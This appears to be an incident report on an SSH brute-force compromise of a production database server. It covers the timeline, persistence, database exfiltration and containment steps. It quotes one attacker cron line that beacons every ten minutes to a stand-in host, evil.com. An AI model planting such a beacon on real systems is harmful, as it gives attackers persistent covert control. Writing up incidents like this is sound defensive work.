# Incident Report — db-prod-01 SSH Compromise & Data Exfiltration

## Executive Summary
Production database db-prod-01 compromised via SSH brute force from TOR exit node 185.220.101.45. 
Attacker established persistence (cron C2), exfiltrated 1.2GB database, contained via host 
isolation at 14:45 UTC. Investigation ongoing to determine full data scope.

## Timeline
- 14:30 — SSH brute force detected (12 failed attempts from 185.220.101.45)
- 14:32 — Successful SSH login for dbadmin from same IP
- 14:34 — sudo command executed by dbadmin
- 14:38 — Cron persistence established (*/10 min C2 beacon to evil.com)
- 14:38 — Database exfiltration begins (mysqldump to attacker IP)
- 14:39 — 1.2 GB data transfer confirmed in network logs
- 14:45 — Host db-prod-01 isolated (network disconnected)
- 14:45 — dbadmin account disabled
- 14:46 — Source IP 185.220.101.45 blocked at firewall

## Compromise Details
**User Compromised:** dbadmin  
**Host Affected:** db-prod-01 (production database, critical)  
**Attack Vector:** SSH brute force  
**Source IP:** 185.220.101.45 (TOR exit node)  
**Persistence Mechanism:** Cron job (*/10 * * * * curl http://evil.com/beacon.sh)  
**Data Exfiltrated:** Full database dump (1.2GB confirmed, ~5GB estimated total)  

## Containment Actions
1. **Host Isolation (14:45 UTC)** — db-prod-01 network disconnected in coordination with ops team
2. **Account Lockout (14:45 UTC)** — dbadmin account disabled to prevent re-entry
3. **Firewall Block (14:46 UTC)** — Inbound rule added to deny 185.220.101.45

## Status
**Threat Level:** Contained (active exfiltration stopped, persistence mechanism dormant)  
**Investigation:** Ongoing — determining full data scope and lateral movement potential  
**Next Steps:** Forensic analysis, password reset for all database accounts, infrastructure hardening
